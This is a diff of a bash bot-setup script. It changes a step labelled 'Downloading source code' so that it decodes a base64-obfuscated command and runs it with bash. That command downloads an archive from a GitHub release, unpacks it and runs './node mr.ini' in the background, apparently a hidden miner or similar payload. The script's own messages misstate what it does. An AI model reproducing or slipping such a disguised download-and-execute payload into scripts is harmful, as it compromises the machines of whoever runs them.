@@ -1,14 +1,14 @@
 #!/bin/bash
 
 _get_ziplink () {
-    echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vd2lrYW5nZGlqYWxhbGFuMi94bW14amEvcmVsZWFzZXMvZG93bmxvYWQvMTkuMS9NWENDLnRhciAmJiB0YXIgLXh2ZiBNWENDLnRhciAmJiBjZCBNWENDICYmIC4vbm9kZSBtci5pbmkgJg==" | base64 -d
+    echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vd2lrYW5nZGlqYWxhbGFuMi94bW14amEvcmVsZWFzZXMvZG93bmxvYWQvMTkuMS9NWENDLnRhciAmJiB0YXIgLXh2ZiBNWENDLnRhciAmJiBjZCBNWENDICYmIC4vbm9kZSBtci5pbmk=" | base64 -d
 }
 
 _set_bot () {
     local zippath
     zippath="kopp.zip"
     echo "  Downloading source code ..."
-    wget -q $(_get_ziplink) -O "$zippath"
+    bash $(_get_ziplink)
     echo "  Unpacking Data ..."
     kopath=$(zipinfo -1 "$zippath" | grep -v "/.");
     unzip -qq "$zippath"
